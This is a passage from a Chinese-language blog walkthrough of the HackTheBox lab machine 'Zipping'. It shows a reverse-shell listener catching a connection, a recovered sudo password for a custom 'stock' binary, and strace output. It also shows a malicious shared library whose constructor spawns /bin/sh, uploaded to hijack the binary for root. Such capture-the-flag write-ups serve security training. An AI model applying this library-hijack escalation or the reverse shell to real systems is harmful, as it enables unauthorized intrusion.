class="string">__dso_handle</span></span><br><span class="line"><span class="string">_IO_stdin_used</span></span><br><span class="line"><span class="string">checkAuth</span></span><br><span class="line"><span class="string">_end</span></span><br><span class="line"><span class="string">__bss_start</span></span><br><span class="line"><span class="string">main</span></span><br><span class="line"><span class="string">fopen@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__isoc99_scanf@GLIBC_2.7</span></span><br><span class="line"><span class="string">exit@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">__TMC_END__</span></span><br><span class="line"><span class="string">_ITM_registerTMCloneTable</span></span><br><span class="line"><span class="string">__cxa_finalize@GLIBC_2.2.5</span></span><br><span class="line"><span class="string">_init</span></span><br><span class="line"><span class="string">.symtab</span></span><br><span class="line"><span class="string">.strtab</span></span><br><span class="line"><span class="string">.shstrtab</span></span><br><span class="line"><span class="string">.interp</span></span><br><span class="line"><span class="string">.note.gnu.property</span></span><br><span class="line"><span class="string">.note.gnu.build-id</span></span><br><span class="line"><span class="string">.note.ABI-tag</span></span><br><span class="line"><span class="string">.gnu.hash</span></span><br><span class="line"><span class="string">.dynsym</span></span><br><span class="line"><span class="string">.dynstr</span></span><br><span class="line"><span class="string">.gnu.version</span></span><br><span class="line"><span class="string">.gnu.version_r</span></span><br><span class="line"><span class="string">.rela.dyn</span></span><br><span class="line"><span class="string">.rela.plt</span></span><br><span class="line"><span class="string">.init</span></span><br><span class="line"><span class="string">.plt.got</span></span><br><span class="line"><span class="string">.text</span></span><br><span class="line"><span class="string">.fini</span></span><br><span class="line"><span class="string">.rodata</span></span><br><span class="line"><span class="string">.eh_frame_hdr</span></span><br><span class="line"><span class="string">.eh_frame</span></span><br><span class="line"><span class="string">.init_array</span></span><br><span class="line"><span class="string">.fini_array</span></span><br><span class="line"><span class="string">.dynamic</span></span><br><span class="line"><span class="string">.got.plt</span></span><br><span class="line"><span class="string">.data</span></span><br><span class="line"><span class="string">.bss</span></span><br><span class="line"><span class="string">.comment</span></span><br><span class="line"><span class="string">rektsu@zipping:/home/rektsu$ </span></span><br></pre></td></tr></table></figure>



<p><img src="/../images/image-20231125211932656.png" alt="image-20231125211932656"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/Zipping]</span><br><span class="line">└─$ nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.14] from (UNKNOWN) [10.10.11.229] 55536</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1152): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">rektsu@zipping:/var/www/html/shop$ python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">&lt;hop$ python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">rektsu@zipping:/var/www/html/shop$ sudo /usr/bin/stock</span><br><span class="line">sudo /usr/bin/stock</span><br><span class="line">Enter the password: St0ckM4nager</span><br><span class="line">St0ckM4nager</span><br><span class="line"></span><br><span class="line">================== Menu ==================</span><br><span class="line"></span><br><span class="line">1) See the stock</span><br><span class="line">2) Edit the stock</span><br><span class="line">3) Exit the program</span><br><span class="line"></span><br><span class="line">Select an option: 1</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">================== Stock Actual ==================</span><br><span class="line"></span><br><span class="line">Colour     Black   Gold    Silver</span><br><span class="line">Amount     0       0       0      </span><br><span class="line"></span><br><span class="line">Quality   Excelent Average Poor</span><br><span class="line">Amount    0         0       0   </span><br><span class="line"></span><br><span class="line">Exclusive Yes    No</span><br><span class="line">Amount    0      0   </span><br><span class="line"></span><br><span class="line">Warranty  Yes    No</span><br><span class="line">Amount    0      0   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">================== Menu ==================</span><br><span class="line"></span><br><span class="line">1) See the stock</span><br><span class="line">2) Edit the stock</span><br><span class="line">3) Exit the program</span><br><span class="line"></span><br><span class="line">Select an option: 2</span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">================== Edit Stock ==================</span><br><span class="line"></span><br><span class="line">Enter the information of the watch you wish to update:</span><br><span class="line">Colour (0: black, 1: gold, 2: silver): 1</span><br><span class="line">1</span><br><span class="line">Quality (0: excelent, 1: average, 2: poor): 0</span><br><span class="line">0</span><br><span class="line">Exclusivity (0: <span class="built_in">yes</span>, 1: no): 0</span><br><span class="line">0</span><br><span class="line">Warranty (0: <span class="built_in">yes</span>, 1: no): 0</span><br><span class="line">0</span><br><span class="line">Amount: 1</span><br><span class="line">1</span><br><span class="line">The stock has been updated correctly.</span><br><span class="line"></span><br><span class="line">================== Menu ==================</span><br><span class="line"></span><br><span class="line">1) See the stock</span><br><span class="line">2) Edit the stock</span><br><span class="line">3) Exit the program</span><br><span class="line"></span><br><span class="line">Select an option: </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>stock文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rektsu@zipping:/usr/bin$ file stock</span><br><span class="line">file stock</span><br><span class="line">stock: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa34d8030176fe286f8011c9d4470714d188ab42, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br><span class="line">rektsu@zipping:/usr/bin$ </span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20231125212809544.png" alt="image-20231125212809544"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">rektsu@zipping:/usr/bin$ strace stock</span><br><span class="line">strace stock</span><br><span class="line">execve(<span class="string">&quot;/usr/bin/stock&quot;</span>, [<span class="string">&quot;stock&quot;</span>], 0x7ffd75cd8590 /* 15 vars */) = 0</span><br><span class="line">brk(NULL)                               = 0x555976c07000</span><br><span class="line">arch_prctl(0x3001 /* ARCH_??? */, 0x7ffca447e0a0) = -1 EINVAL (Invalid argument)</span><br><span class="line">mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fe96824d000</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">newfstatat(3, <span class="string">&quot;&quot;</span>, &#123;st_mode=S_IFREG|0644, st_size=18225, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">mmap(NULL, 18225, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fe968248000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line"><span class="built_in">read</span>(3, <span class="string">&quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\3206\2\0\0\0\0\0&quot;</span>..., 832) = 832</span><br><span class="line">pread64(3, <span class="string">&quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;</span>..., 784, 64) = 784</span><br><span class="line">newfstatat(3, <span class="string">&quot;&quot;</span>, &#123;st_mode=S_IFREG|0644, st_size=2072888, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">pread64(3, <span class="string">&quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;</span>..., 784, 64) = 784</span><br><span class="line">mmap(NULL, 2117488, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7fe968000000</span><br><span class="line">mmap(0x7fe968022000, 1544192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x22000) = 0x7fe968022000</span><br><span class="line">mmap(0x7fe96819b000, 356352, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x19b000) = 0x7fe96819b000</span><br><span class="line">mmap(0x7fe9681f2000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1f1000) = 0x7fe9681f2000</span><br><span class="line">mmap(0x7fe9681f8000, 53104, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7fe9681f8000</span><br><span class="line">close(3)                                = 0</span><br><span class="line">mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7fe968245000</span><br><span class="line">arch_prctl(ARCH_SET_FS, 0x7fe968245740) = 0</span><br><span class="line">set_tid_address(0x7fe968245a10)         = 28125</span><br><span class="line">set_robust_list(0x7fe968245a20, 24)     = 0</span><br><span class="line">rseq(0x7fe968246060, 0x20, 0, 0x53053053) = 0</span><br><span class="line">mprotect(0x7fe9681f2000, 16384, PROT_READ) = 0</span><br><span class="line">mprotect(0x555974cab000, 4096, PROT_READ) = 0</span><br><span class="line">mprotect(0x7fe968283000, 8192, PROT_READ) = 0</span><br><span class="line">prlimit64(0, RLIMIT_STACK, NULL, &#123;rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY&#125;) = 0</span><br><span class="line">munmap(0x7fe968248000, 18225)           = 0</span><br><span class="line">newfstatat(1, <span class="string">&quot;&quot;</span>, &#123;st_mode=S_IFSOCK|0777, st_size=0, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line">getrandom(<span class="string">&quot;\xcb\x40\xbe\x31\x0e\x8d\x6c\x13&quot;</span>, 8, GRND_NONBLOCK) = 8</span><br><span class="line">brk(NULL)                               = 0x555976c07000</span><br><span class="line">brk(0x555976c28000)                     = 0x555976c28000</span><br><span class="line">newfstatat(0, <span class="string">&quot;&quot;</span>, &#123;st_mode=S_IFSOCK|0777, st_size=0, ...&#125;, AT_EMPTY_PATH) = 0</span><br><span class="line"><span class="built_in">read</span>(0, </span><br><span class="line"><span class="string">&quot;\n&quot;</span>, 4096)                     = 1</span><br><span class="line">write(1, <span class="string">&quot;Enter the password: Invalid pass&quot;</span>..., 56Enter the password: Invalid password, please try again.</span><br><span class="line">) = 56</span><br><span class="line">exit_group(1)                           = ?</span><br><span class="line">+++ exited with 1 +++</span><br><span class="line">rektsu@zipping:/usr/bin$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>本地没法使用</p>
<p><img src="/../images/image-20231125214056759.png" alt="image-20231125214056759"></p>
<p><img src="/../images/image-20231125220131664.png" alt="image-20231125220131664"></p>
<p>libcounter.c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">void vuln_func() &#123;</span><br><span class="line">	system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">__attribute__((constructor))</span><br><span class="line">void setup() &#123;</span><br><span class="line">	vuln_func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20231125220400689.png" alt="image-20231125220400689"></p>
<p>将.so文件上传到靶机</p>
<p><img src="/../images/image-20231125220237263.png" alt="image-20231125220237263"></p>
<p><img src="/../images/image-20231125215814590.png" alt="image-20231125215814590"></p>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2023/11/26/HTB-M0rsarchive/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/11/21/HTB-Analytics/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-11-25 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Machines/">Machines<span>7</span></a></li> <li><a href="/categories/Machines/Lab/">Lab<span>7</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/HTB/">HTB<span>9</span></a></li> <li><a href="/tags/medium/">medium<span>2</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2024 Lavande's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
